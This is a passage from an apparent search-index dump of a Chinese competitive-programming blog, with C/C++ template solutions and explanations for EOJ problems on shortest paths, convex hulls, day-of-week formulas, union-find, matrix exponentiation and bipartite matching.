x2 - x1; c = x1 * y2 - y1 * x2; f1 = a * xl + b * yb + c; f2 = a * xl + b * yt + c; f3 = a * xr + b * yb + c; f4 = a * xr + b * yt + c; if ((f1\u0026gt;0 \u0026amp;\u0026amp; f2\u0026gt;0 \u0026amp;\u0026amp; f3\u0026gt;0 \u0026amp;\u0026amp; f4\u0026gt;0) || (f1\u0026lt;0 \u0026amp;\u0026amp; f2\u0026lt;0 \u0026amp;\u0026amp; f3\u0026lt;0 \u0026amp;\u0026amp; f4\u0026lt;0)) printf(\u0026#34;F\\n\u0026#34;); else if ((x1\u0026gt; xr \u0026amp;\u0026amp; x2 \u0026gt; xr) || (x1 \u0026lt; xl \u0026amp;\u0026amp; x2 \u0026lt; xl)) printf(\u0026#34;F\\n\u0026#34;); else if ((y1\u0026gt; yt \u0026amp;\u0026amp; y2 \u0026gt; yt) || (y1 \u0026lt; yb \u0026amp;\u0026amp; y2 \u0026lt; yb)) printf(\u0026#34;F\\n\u0026#34;); else printf(\u0026#34;T\\n\u0026#34;); } return 0; } Graham 求凸包 (EOJ 1189) # 给定平面上的 n 个点及半径 r，求圆的周长与凸包周长之和。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const double PI = acos(-1.0); const int maxn = 1005; struct point {int x, y;}p[maxn]; int s[maxn], top; inline int cross(point p0, point p1, point p2) { return (p1.x-p0.x) * (p2.y-p0.y) - (p1.y-p0.y) * (p2.x-p0.x); } inline double dis(point p1, point p2) { return sqrt((p2.x-p1.x)*(p2.x-p1.x) + (p2.y-p1.y)*(p2.y-p1.y)); } inline bool cmp(point p1, point p2) { int c = cross(p[0], p1, p2); if (c\u0026gt; 0) return 1; else if (!c \u0026amp;\u0026amp; dis(p[0], p1) \u0026lt;dis(p[0], p2)) return 1; return 0; } inline void graham(int n) { s[0] = 0; if (n == 1) top = 0; else { s[1] = top = 1; if (n == 2) return; for (int i = 2; i \u0026lt; n; ++i) { while (top \u0026amp;\u0026amp; cross(p[s[top-1]], p[s[top]], p[i]) \u0026lt;= 0) --top; s[++top] = i; } } } int main() { int n, r; double ans; while (cin\u0026gt;\u0026gt; n \u0026gt;\u0026gt; r) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;p[0].x, \u0026amp;p[0].y); point p0; p0.x = p[0].x; p0.y = p[0].y; int k = 0; for (int i = 1; i \u0026lt; n; ++i) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;p[i].x, \u0026amp;p[i].y); if ((p0.y\u0026gt;p[i].y) || ((p0.y==p[i].y)\u0026amp;\u0026amp;(p0.x\u0026gt;p[i].x))) { p0.x = p[i].x; p0.y = p[i].y; k = i; } } p[k] = p[0]; p[0] = p0; sort(p+1, p+n, cmp); graham(n); ans = 2 * PI * r; for (int i = 0; i \u0026lt;= top; ++i) ans += dis(p[s[i]], p[s[(i+1) % (top+1)]]); printf(\u0026#34;%d\\n\u0026#34;, (int)(ans+0.5)); } return 0; } ","date":"2018-02-05","permalink":"/posts/templates/","section":"Posts","summary":"\u003cp\u003e全是不太熟的模板。\u003c/p\u003e","title":"OJ 常用的模板们"},{"content":"","date":"2018-02-05","permalink":"/tags/%E7%9F%A9%E9%98%B5/","section":"Tags","summary":"","title":"矩阵"},{"content":"","date":"2018-02-05","permalink":"/tags/%E5%9B%BE%E8%AE%BA/","section":"Tags","summary":"","title":"图论"},{"content":"Dijkstra, Bellman-Ford \u0026amp;\u0026amp; SPFA.\nEOJ 3196 Wormholes # 其实就是判断图中是否有负环……SPFA 或者 Bellman-Ford 判负环。写的时候还不会 SPFA，所以这里用的 Bellman-Ford。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 505; const int M = 2550; const int INF = 1e6; int n, m, k, cnt, dis[N]; struct node {int u, v, w;}e[M\u0026lt;\u0026lt;1]; void add_edge(int uu, int vv, int ww) { e[cnt].u = uu; e[cnt].v = vv; e[cnt++].w = ww; } bool bellman_ford() { int i; for (i = 1; i \u0026lt;= n; ++i) dis[i] = INF; for (i = 1; i \u0026lt; n; ++i) { bool flag = 0; for (int j = 1; j \u0026lt;= cnt; ++j) if (dis[e[j].v] \u0026gt; dis[e[j].u] + e[j].w) { dis[e[j].v] = dis[e[j].u] + e[j].w; flag = 1; } if (!flag) break; } for (i = 1; i \u0026lt;= cnt; ++i) if (dis[e[i].v] \u0026gt; dis[e[i].u] + e[i].w) return 1; return 0; } int main() { int t, u, v, w; cin \u0026gt;\u0026gt; t; while (t--) { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m \u0026gt;\u0026gt; k; cnt = 1; while (m--) { cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v \u0026gt;\u0026gt; w; add_edge(u, v, w); add_edge(v, u, w); } while (k--) { cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v \u0026gt;\u0026gt; w; add_edge(u, v, -w); } cout \u0026lt;\u0026lt;(bellman_ford() ? \u0026#34;YES\u0026#34; : \u0026#34;NO\u0026#34;) \u0026lt;\u0026lt; endl; } return 0; } EOJ 3202 Roadblocks # 求次短路的模板题。用 dist, dist2 分别保存最短路和次短路，用 Dijkstra 更新这两个数组，最后 dist2[n-1] 就是答案。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 5010; const int INF = 0x3f3f3f3f; int n, m, dist[N], dist2[N]; struct edge {int to, cost;}; typedef pair\u0026lt;int, int\u0026gt; P; vector\u0026lt;edge\u0026gt; g[N]; void dijkstra() { priority_queue\u0026lt;P, vector\u0026lt;P\u0026gt;, greater\u0026lt;P\u0026gt; \u0026gt; q; fill(dist, dist + n, INF); fill(dist2, dist2 + n, INF); dist[0] = 0; q.push(P(0, 0)); while (!q.empty()) { P p = q.top(); q.pop(); int v = p.second, d = p.first; if (dist2[v] \u0026lt;d) continue; for (int i = 0; i \u0026lt; g[v].size(); ++i) { edge \u0026amp;e = g[v][i]; int d2 = d + e.cost; if (dist[e.to] \u0026gt; d2) { swap(dist[e.to], d2); q.push(P(dist[e.to], e.to)); } if (dist2[e.to] \u0026gt; d2 \u0026amp;\u0026amp; dist[e.to] \u0026lt;d2) { dist2[e.to] = d2; q.push(P(dist2[e.to], e.to)); } } } } int main() { int u, v, w; while (cin\u0026gt;\u0026gt; n \u0026gt;\u0026gt; m) { for (int i = 0; i \u0026lt; n; ++i) g[i].clear(); for (int i = 0; i \u0026lt; m; ++i) { cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v \u0026gt;\u0026gt; w; g[u-1].push_back((edge){v-1, w}); g[v-1].push_back((edge){u-1, w}); } dijkstra(); cout \u0026lt;\u0026lt;dist2[n-1] \u0026lt;\u0026lt; endl; } return 0; } EOJ 3197 Invitation Cards # 有编号 1～P 的站点， 有 Q 条公交车路线，公交车路线只从一个起点站直接到达终点站，是单向的，每条路线有它自己的车费。 有 P 个人早上从 1 出发，他们要到达每一个公交站点， 然后到了晚上再返回点 1。 求所有人来回的最小费用之和。\n去的时候比较容易，就是求单源最短路；回来时是求多点到单点的最短路，考虑反向建图，那么问题也化为求单源最短路。两次 SPFA 即可。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 1e6 + 10; const int INF = 0x3f3f3f3f; typedef long long ll; int n, m, head1[N], head2[N], dis[N], t1, t2; bool vis[N]; struct node {int u, v, w, next;} edge1[N\u0026lt;\u0026lt;1], edge2[N\u0026lt;\u0026lt;1]; ll spfa(node edge[], int head[]) { for (int i = 1; i \u0026lt;= n; ++i) dis[i] = INF, vis[i] = 0; queue\u0026lt;int\u0026gt; q; q.push(1); dis[1] = 0, vis[1] = 1; while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for (int i = head[u]; ~i; i = edge[i].next) { int v = edge[i].v; if (dis[v] \u0026gt; edge[i].w + dis[u]) { dis[v] = edge[i].w + dis[u]; if (!vis[v]) vis[v] = 1, q.push(v); } } } ll ans = 0; for (int i = 1; i \u0026lt;= n; ++i) ans += dis[i]; return ans; } void add_edge(int u, int v, int w) { edge1[t1].v = v; edge1[t1].w = w; edge1[t1].next = head1[u]; head1[u] = t1++; edge2[t2].v = u; edge2[t2].w = w; edge2[t2].next = head2[v]; head2[v] = t2++; } int main() { int t, u, v, w; cin \u0026gt;\u0026gt; t; while (t--) { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; t1 = t2 = 0; memset(head1, -1, sizeof(head1)); memset(head2, -1, sizeof(head2)); for (int i = 0; i \u0026lt; m; ++i) { cin \u0026gt;\u0026gt; u \u0026gt;\u0026gt; v \u0026gt;\u0026gt; w; add_edge(u, v, w); } cout \u0026lt;\u0026lt;spfa(edge1, head1) + spfa(edge2, head2) \u0026lt;\u0026lt; endl; } return 0; } 计算最短路径条数 # 求出有 n (1 \u0026lt; n ≤ 100) 个结点有向图中，结点 1 到结点 n 的最短路径，以及最短路径的条数。 第一行有 2 个整数 n, m (0 \u0026lt; m \u0026lt; 3000)，接下来 m 行每行有三个整数 u, v, w 结点 u 到 v 有一条权为 w 的边 (w \u0026lt; 1e5)。\nDijkstra 模板题 + 重边判定。cnt 数组记录最短路条数，same 数组记录原来边的条数（也就记录了重边条数）。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 105; const int INF = 0x3f3f3f3f; int v[N], d[N], mp[N][N], cnt[N], same[N][N]; int n, m; void init() { memset(same, 0, sizeof(same)); for (int i = 0; i \u0026lt; N; ++i) for (int j = 0; j \u0026lt; N; ++j) mp[i][j] = INF; int u, v, w; while (m--) { scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;u, \u0026amp;v, \u0026amp;w); mp[u-1][v-1] = w; ++same[u-1][v-1]; } for (int i = 0; i \u0026lt; n; ++i) { d[i] = (i ? INF : 0); cnt[i] = (i ? 0 : 1); } } void dijkstra() { for (int i = 0; i \u0026lt; n; ++i) { int x, now = INF; for (int y = 0; y \u0026lt; n; ++y) if (!v[y] \u0026amp;\u0026amp; d[y] \u0026lt;= now) now = d[x=y]; v[x] = 1; for (int y = 0; y \u0026lt; n; ++y) if (!v[y]) { if (d[x] + mp[x][y] == d[y]) cnt[y] += cnt[x] * same[x][y]; else if (d[x] + mp[x][y] \u0026lt;d[y]) { cnt[y] = cnt[x] * same[x][y]; d[y] = d[x] + mp[x][y]; } } } } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; init(); memset(v, 0, sizeof(v)); dijkstra(); if (d[n-1] == INF) d[n-1] = -1; cout \u0026lt;\u0026lt;d[n-1] \u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt; cnt[n-1] \u0026lt;\u0026lt; endl; return 0; } ","date":"2018-02-04","permalink":"/posts/shortest-path/","section":"Posts","summary":"\u003cp\u003eDijkstra, Bellman-Ford \u0026amp;\u0026amp; SPFA.\u003c/p\u003e","title":"最短路问题"},{"content":"整理了 EOJ 中遇到的一些值得一记的题目。\nEOJ1424 Hard to Believe, but True! # 给定一个等式，问等式从右往左读是否正确。\n题目不难，不过用到了一些有趣的字符串处理，所以记录下来。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void rev_str(char s[]){ int c,i,j, len = strlen(s); for (i = 0, j = len - 1; i \u0026lt; j; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; } } int main() { char str1[8]={0},str2[8]={0},str3[8]={0}; while (~scanf(\u0026#34;%[^+]+%[^=]=%s\u0026#34;, str1, str2, str3)){ rev_str(str1);rev_str(str2);rev_str(str3); if (atoi(str3) == atoi(str2) + atoi(str1)) printf(\u0026#34;True\\n\u0026#34;); else printf(\u0026#34;False\\n\u0026#34;); if (atoi(str3) == 0 \u0026amp;\u0026amp; atoi(str2) == 0 \u0026amp;\u0026amp; atoi(str1) == 0) break; } return 0; } EOJ3322 万年历 # 给定一个日期，输出该日期是星期几。\n这是个历史题，就是所谓 OEIS 题的同类。\n为什么说是历史题？ # 罗马教皇格里高利十三世在 1582 年组织了一批天文学家，根据哥白尼日心说计算出来的数据，对儒略历作了修改。将 1582 年 10 月 5 日到 14 日之间的 10 天宣布撤销，继 10 月 4 日之后为 10 月 15 日。后来人们将这一新的历法称为 “格里高利历”，也就是今天世界上所通用的历法，简称格里历或公历。\n所以怎么算星期几？ # 蔡勒公式 (Zeller formula)：\n1582.10.4 后：\n$$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d-1)%7\n$$\n1582.10.4 及之前：\n$$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d+2)%7 $$\n其中 m, d 对应月日，c 为年份前两位（世纪数 ** 减 1**），y 为年份后两位。\n基姆拉尔森公式 (Kim larsson calculation formula)：\n$$ w=(d+2m+[\\frac{3(m+1)}{5}]+y+[\\frac{y}{4}]-[\\frac{y}{100}]+[\\frac{y}{400}]+1)%7 $$\n需要注意的是，基姆拉尔森公式的结果为 0 时表示周一，6 表示周日，以此类推。\n注意事项 # 两个公式都需要把每年的 1，2 两月看作上一年的 13，14 两月。 另有一种需要事先计算年月基数表的计算方法，由于较繁琐这里不再赘述。 代码 # （仅以蔡勒公式为例）\n#include \u0026lt;stdio.h\u0026gt; void calc_day(int y, int m, int d) { if (m == 1 || m == 2){ // 1 月 2 月情况特判 --y; m += 12; } int c = y / 100; // 取年份前两位 int yy = y - c * 100; // 取年份后两位 int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; // 蔡勒公式 if (y \u0026lt;= 1582 \u0026amp;\u0026amp; m \u0026lt;= 10 \u0026amp;\u0026amp; d \u0026lt;= 4) day += 3; // 判断是否在 1582 年 10 月 4 日前 while (day \u0026lt; 0) day += 7; // 结果可能为负，这里避免了容易出错的负数取模运算 day %= 7; switch(day){ case 1: printf(\u0026#34;Monday\\n\u0026#34;);break; case 2: printf(\u0026#34;Tuesday\\n\u0026#34;);break; case 3: printf(\u0026#34;Wednesday\\n\u0026#34;);break; case 4: printf(\u0026#34;Thursday\\n\u0026#34;);break; case 5: printf(\u0026#34;Friday\\n\u0026#34;);break; case 6: printf(\u0026#34;Saturday\\n\u0026#34;);break; default: printf(\u0026#34;Sunday\\n\u0026#34;); } return; } int main(void) { int y, m, d; scanf(\u0026#34;%d-%d-%d\u0026#34;, \u0026amp;y, \u0026amp;m, \u0026amp;d); calc_day(y, m, d); return 0; } EOJ1224 简单迷宫问题 # 一天，sunny 不小心进入了一个迷宫，不仅很难寻找出路，而且有的地方还有怪物，但是 sunny 有足够的能力杀死怪物，但是需要一定的时间，但是 sunny 想早一点走出迷宫，所以请你帮助他计算出最少的时间走出迷宫，输出这个最少时间。 我们规定每走一格需要时间单位 1, 杀死怪物也需要时间 1, 如果不能走到出口，则输出 impossible. 每次走只能是上下左右 4 个方向。\n先四面造墙，省去判断是否出界的函数。之后对于有怪物的格子，新状态再搜索树中是当前状态的下两层的，因此不能走过之后直接 step+2 标记掉，而是要记录下这个状态 (cnt=1)。很容易 WA 的点。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;queue\u0026gt; using namespace std; #define NEXT mp[p.x+dx[i]][p.y+dy[i]] struct node{int x, y, step, cnt;}; char mp[202][202]; int sx, sy, n, m, i; const int dx[4] = {-1, 0, 1, 0}; const int dy[4] = {0, 1, 0, -1}; void bfs() { queue\u0026lt;node\u0026gt; q; q.push({sx, sy, 0, 0}); mp[sx][sy] = \u0026#39;#\u0026#39;; while (!q.empty()){ node p = q.front(); q.pop(); if (p.cnt == 1){ p.cnt = 0; q.push(p); continue; } for (i = 0; i \u0026lt; 4; ++i) switch(NEXT){ case \u0026#39;.\u0026#39;: NEXT = \u0026#39;#\u0026#39;; q.push({p.x+dx[i], p.y+dy[i], p.step+1, 0}); break; case \u0026#39;X\u0026#39;: NEXT = \u0026#39;#\u0026#39;; q.push({p.x+dx[i], p.y+dy[i], p.step+2, 1}); break; case \u0026#39;T\u0026#39;: printf(\u0026#34;%d\\n\u0026#34;, p.step+1); return; } } printf(\u0026#34;impossible\\n\u0026#34;); } void init() { sx = sy = 0; for (i = 1; i \u0026lt;= n; ++i){ for (int j = 1; j \u0026lt;= m; ++j){ scanf(\u0026#34;%c\u0026#34;, \u0026amp;mp[i][j]); if (mp[i][j] == \u0026#39;S\u0026#39;) sx = i, sy = j; } getchar(); } for (i = 0; i \u0026lt;= m+1; ++i) mp[0][i] = mp[n+1][i] = \u0026#39;#\u0026#39;; for (i = 0; i \u0026lt;= n+1; ++i) mp[i][0] = mp[i][m+1] = \u0026#39;#\u0026#39;; } int main() { while (~scanf(\u0026#34;%d%d\\n\u0026#34;, \u0026amp;n, \u0026amp;m)){ init(); bfs(); } return 0; } EOJ3367 咸鱼翻身 # 给定 01 序列，选择一个区间，对区间中每个数取反（0 变 1，1 变 0），求 1 最多能有多少个。\n最大区间和问题。对于 1，翻转后收益（1 的个数）为 -1；对于 0，翻转后收益为 +1。方便起见，读入时直接把数字转换为收益。最后求最大区间和，加上原来 1 的个数就是答案。由于和最大的区间中不会有 -1 出现，区间所覆盖的位置也不会包括原来 1 所在的位置，因此不会重复。\n#include \u0026lt;stdio.h\u0026gt; int a[100001]; int main() { int n,i,j,sum = 0,tot = 0,ans; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (i = 0; i \u0026lt; n; ++i){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;j); if (j){ a[i] = -1; sum++; } else a[i] = 1; } ans = a[0]; for (i = 0; i \u0026lt; n; ++i){ if (tot\u0026gt; 0) tot += a[i]; else tot = a[i]; ans = (tot\u0026gt;ans)?tot:ans; } printf(\u0026#34;%d\\n\u0026#34;, ans + sum); return 0; } EOJ3388 Balanced Lineup # 给定一个数列，求询问区间中的最大最小值之差。\n普通方法用线段树或 ST 算法，对这题来说区间 RMQ 就可以了。时间复杂度 O(nlogn)。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cmath\u0026gt; using namespace std; int linemax[50001][20], linemin[50001][20]; void rmq(int n) { for (int j = 1; j \u0026lt; 20; ++j) for (int i = 1; i \u0026lt;= n; ++i) if (i + (1 \u0026lt;\u0026lt; j) - 1 \u0026lt;= n){ linemax[i][j] = max(linemax[i][j - 1], linemax[i + (1 \u0026lt;\u0026lt; (j - 1))][j - 1]); linemin[i][j] = min(linemin[i][j - 1], linemin[i + (1 \u0026lt;\u0026lt; (j - 1))][j - 1]); } } int main(void) { int n, len, a, b, x, maxc, minc; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;len); for (int i = 1; i \u0026lt;= n; ++i){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;linemax[i][0]); linemin[i][0] = linemax[i][0]; } rmq(n); while(len--){ scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); x = (int)(log(b - a + 1) / log(2)); maxc = max(linemax[a][x], linemax[b - (1 \u0026lt;\u0026lt; x) + 1][x]); minc = min(linemin[a][x], linemin[b - (1 \u0026lt;\u0026lt; x) + 1][x]); printf(\u0026#34;%d\\n\u0026#34;, maxc - minc); } return 0; } EOJ1499 矩阵快速幂求斐波那契数列 # 给定 n，求斐波那契数列前 n 项和。 0 \u0026lt; n \u0026lt; 1e9\n快速幂实现方式和整数差不多，没什么好讲的。而对于斐波那契数列，不难发现：\n$$ \\begin{pmatrix} F_{n+2} \u0026amp; a\\cr F_{n+1} \u0026amp; b \\end{pmatrix}{=} \\begin{pmatrix} 1 \u0026amp; 1\\cr 1 \u0026amp; 0 \\end{pmatrix} \\begin{pmatrix} F*{n+1}\\cr F_n \\end{pmatrix} $$\n我们记\n$$ \\begin{pmatrix} 1 \u0026amp; 1\\cr 1 \u0026amp; 0 \\end{pmatrix} $$\n为 $A$，由此我们可以推得：\n$$ \\begin{pmatrix} F*{n+1}\\cr F_n \\end{pmatrix}{=} A^n \\begin{pmatrix} 1\\cr 0 \\end{pmatrix} $$\n于是对 $A^n$ 求解就很容易得到答案了。\n#include \u0026lt;iostream\u0026gt; #define MOD 100000000 using namespace std; typedef long long ll; struct Mat{ ll m[2][2]; }; Mat MatMul(Mat A, Mat B) { Mat ret; for (int i = 0; i \u0026lt; 2; ++i) for (int j = 0 ; j \u0026lt; 2; ++j){ ret.m[i][j] = 0; for (int k = 0; k \u0026lt; 2; ++k) ret.m[i][j] += A.m[i][k] * B.m[k][j] % MOD; } return ret; } Mat MatPow(Mat A, ll n) { Mat ret; ret.m[0][0]=1; ret.m[0][1]=0; ret.m[1][0]=0; ret.m[1][1]=1; while (n){ if (n \u0026amp; 1) ret = MatMul(ret, A); A = MatMul(A, A); n \u0026gt;\u0026gt;= 1; } return ret; } int main() { ll n; while(cin\u0026gt;\u0026gt; n){ Mat ans, A; ans.m[0][0]=1; ans.m[0][1]=0; A.m[0][0]=1; A.m[0][1]=1; A.m[1][0]=1; A.m[1][1]=0; ans = MatMul(ans, MatPow(A, n + 1)); cout \u0026lt;\u0026lt;ans.m[0][0] - 1 \u0026lt;\u0026lt; endl; } return 0; } EOJ3006 计算多项式的系数 # 给定一个多项式 $(ax+by)^k$，计算多项式展开后 $x^ny^m$ 项的系数，结果对 1000000007 取模 0≤k≤1,000,000，0≤n,m≤k，且 n+m=k，0≤a,b≤10^9。\n由于 n, m 过大不能直接预处理组合数；又因为 p 过大 Lucas 定理的递归形式在这里也不能直接使用。后来才发现原来只要预处理阶乘 + 快速幂 + 逆元求组合数就可以了。\n#include \u0026lt;bits/stdc++.h\u0026gt; #define p 1000000007 #define K 1000000 typedef long long ll; ll a, b, k, n, m, fac[K+1]; void init() { fac[0] = 1; for(int i = 1; i \u0026lt;= K; ++i) fac[i] = fac[i-1]*i % p; } ll pow_mod(ll a, ll x) { ll ret = 1; while (x) { if (x \u0026amp; 1) ret = (ret * a) % p; a = (a * a) % p; x \u0026gt;\u0026gt;= 1; } return ret; } ll C(ll n, ll m) { if(m\u0026gt; n) return 0; return fac[n] * pow_mod((fac[m]*fac[n-m])%p, p-2) % p; } int main() { int cas; ll ans; scanf(\u0026#34;%d\u0026#34;, \u0026amp;cas); init(); for (int t = 0; t \u0026lt; cas; ++t) { scanf(\u0026#34;%lld%lld%lld%lld%lld\u0026#34;, \u0026amp;a, \u0026amp;b, \u0026amp;k, \u0026amp;n, \u0026amp;m); ans = pow_mod(a, n); ans = (ans * pow_mod(b, m)) % p; ans = (ans * C(k, m)) % p; printf(\u0026#34;case #%d:\\n%lld\\n\u0026#34;, t, ans); } return 0; } 顺便放个 Lucas 模板备用，n, m 较大而 p 较小时可用：\n#include\u0026lt;bits/stdc++.h\u0026gt; #define P 10007 using namespace std; typedef long long ll; ll pow_mod(ll a, ll x, int p) { ll ret = 1; while(x) { if (x \u0026amp; 1) ret = ret * a % p; a = a * a % p; x \u0026gt;\u0026gt;= 1; } return ret; } ll comb(ll a, ll b, int p) { if (a \u0026lt; b) return 0; if (a == b) return 1; if (b\u0026gt; a - b) b = a - b; ll ans = 1, ca = 1, cb = 1; for (ll i = 0; i \u0026lt; b; ++i) { ca = (ca * (a - i)) % p; cb = (cb * (b - i)) % p; } ans = (ca * pow_mod(cb, p-2, p)) % p; return ans; } ll lucas(ll n, ll m, int p) { ll ans = 1; while(n \u0026amp;\u0026amp; m \u0026amp;\u0026amp; ans) { ans = (ans * comb(n%p, m%p, p)) % p; n /= p; m /= p; } return ans; } int main() { int cas, k; ll a, b, n, m; cin \u0026gt;\u0026gt; cas; for (int t = 0; t \u0026lt; cas; ++t) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; k \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; printf(\u0026#34;case #%d:\\n\u0026#34;, t); if (n + m != k) cout \u0026lt;\u0026lt;\u0026#34;0\u0026#34; \u0026lt;\u0026lt; endl; else { ll ans = pow_mod(a, n, P); ans = (ans * pow_mod(b, m, P)) % P; ans = (ans * lucas(k, n, P)) % P; cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } } return 0; } EOJ3458 Cards Game # 每次从 N 张牌中选择两张，代价为 min(r[i]^b[j], r[j]^b[i]), 然后从两张中选择一张删去进入下一轮，循环直至只剩一张牌，求最小代价和。\n来自 Google Kickstart Round G 2017 的 B 题。MST 的奇怪用法。\n可以发现有 N 张牌，N-1 次操作。在扔掉的牌与留下的牌之间连边，则边的权值 == 题目中的代价。这样求最小代价和就转化成求图的最小生成树问题，Prim 或者 Kruskal（如下代码）直接过。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int N = 101; int r[N], b[N]; int fa[N]; int union_find(int x) { return fa[x] == x ? x : fa[x] = union_find(fa[x]); } bool unite(int a, int b) { a = union_find(a); b = union_find(b); if (a != b) { fa[a] = b; return 1; } return 0; } vector\u0026lt;tuple\u0026lt;int, int, int\u0026gt; \u0026gt; v; ll kruskal() { sort(v.begin(), v.end()); ll ans = 0; for (auto i : v) { int u, v, w; tie(w, u, v) = i; if (unite(u, v)) ans += w; } return ans; } int main() { int cas, n, i; cin \u0026gt;\u0026gt; cas; for (int t = 1; t \u0026lt;= cas; ++t) { cin \u0026gt;\u0026gt; n; v.clear(); for (i = 0; i \u0026lt; n; ++i) cin \u0026gt;\u0026gt; r[i]; for (i = 0; i \u0026lt; n; ++i) cin \u0026gt;\u0026gt; b[i]; for (i = 0; i \u0026lt; n; ++i) { for (int j = i+1; j \u0026lt; n; ++j) v.emplace_back(min(r[i]^b[j], r[j]^b[i]), i, j); fa[i] = i; } printf(\u0026#34;Case #%d: %lld\\n\u0026#34;, t, kruskal()); } return 0; } EOJ2069 Asteroids # N×N 网格中有若干个小行星，武器每次发射可以清除一行或一列，问最少需要发射多少次才能清除全部小行星。\n所有小行星横坐标为一个点集，纵坐标为另一个点集。对于每个小行星，在其横坐标与纵坐标之间连一条边，则问题转化为求二分图最小点覆盖。又因为二分图最小点覆盖 == 二分图最大匹配，所以直接跑匈牙利就行。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; bool path[505][505], v[505]; int ast[505], n, k; bool dfs(int x) { for (int i = 1; i \u0026lt;= n; ++i) if (!v[i] \u0026amp;\u0026amp; path[x][i]) { v[i] = 1; if (!ast[i] || dfs(ast[i])) { ast[i] = x; return 1; } } return 0; } int main() { int x, y, ans = 0; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; while (k--) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); path[x][y] = 1; } for (int i = 1; i \u0026lt;= n; ++i) { memset(v, 0, sizeof(v)); if (dfs(i)) ++ans; } printf(\u0026#34;%d\\n\u0026#34;, ans); return 0; } EOJ3384 食物链 # 动物王国中有三类动物 A,B,C，这三类动物的食物链构成了有趣的环形。A 吃 B，B 吃 C，C 吃 A。 现有 N 个动物，以 1－N 编号。每个动物都是 A,B,C 中的一种，但是我们并不知道它到底是哪一种。 有人用两种说法对这 N 个动物所构成的食物链关系进行描述： 第一种说法是 1 X Y，表示 X 和 Y 是同类。 第二种说法是 2 X Y，表示 X 吃 Y。 此人对 N 个动物，用上述两种说法，一句接一句地说出 K 句话，这 K 句话有的是真的，有的是假的。当一句话满足下列三条之一时，这句话就是假话，否则就是真话： 当前的话与前面的某些真的话冲突，就是假话； 当前的话中 X 或 Y 比 N 大，就是假话； 当前的话表示 X 吃 X，就是假话。 你的任务是根据给定的 N (1≤N≤50 000) 和 K 句话 (0≤K≤100 000)，输出假话的总数。\n经典并查集（对我来说还是太难了）。代码中 kind 数组为 0 表示与父节点同类，1 表示被父节点吃，2 表示吃父节点。 初始化时，每个节点自身成为一个集合，并且父节点也是自身（0：同类）。路径压缩的时候可以顺便更新掉 kind 数组的状态。\nUnion 函数中：\n如果 x,y 不在一个集合中，关于合并之后 kind 要怎么变化，这个式子我纯粹靠找规律写了，可能网上有更靠谱的解法。 如果 x,y 同属一个集合，那么只需要验证这句话是不是对的就可以了。 #include \u0026lt;iostream\u0026gt; using namespace std; int father[50005], kind[50005]; int Find(int x) { if (x == father[x]) return father[x]; int y = Find(father[x]); kind[x] = (kind[x] + kind[father[x]]) % 3; return father[x] = y; } int Union(int op, int sp1, int sp2) { int x = Find(sp1), y = Find(sp2); if (x == y){ if ((kind[sp1] - kind[sp2] + 3) % 3 == op - 1) return 0; return 1; } father[x] = y; kind[x] = (-kind[sp1] + op - 1 + kind[sp2] + 3) % 3; return 0; } int main() { int n, k, op, sp1, sp2, cnt = 0, i; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; for (i = 1; i \u0026lt;= n; ++i){ father[i] = i; kind[i] = 0; } for (i = 0;i \u0026lt; k; ++i){ cin \u0026gt;\u0026gt; op \u0026gt;\u0026gt; sp1 \u0026gt;\u0026gt; sp2; if (op == 2 \u0026amp;\u0026amp; sp1 == sp2) ++cnt; else if (sp1\u0026gt; n || sp2 \u0026gt; n) ++cnt; else cnt += Union(op, sp1, sp2); } cout \u0026lt;\u0026lt; cnt \u0026lt;\u0026lt; endl; return 0; } ","date":"2018-02-02","permalink":"/posts/eoj-misc/","section":"Posts","summary":"\u003cp\u003e整理了 EOJ 中遇到的一些值得一记的题目。\u003c/p\u003e","title":"EOJ 杂题合集"},{"content":"对我而言不那么简单的 DP 题目。\n1009 整数的拆分 # 将正整数 n 表示成一系列正整数之和 : n=n1+n2+…+nk，其中 n1≥n2≥…≥nk≥1(k≥1) 正整数 n 的这种表示称为正整数 n 的拆分。求正整数 n 的不同拆分个数。 例如，正整数 6 有如下 11 种不同的拆分 : 6； 5+1； 4+2，4+1+1； 3+3，3+2+1，3+1+1+1； 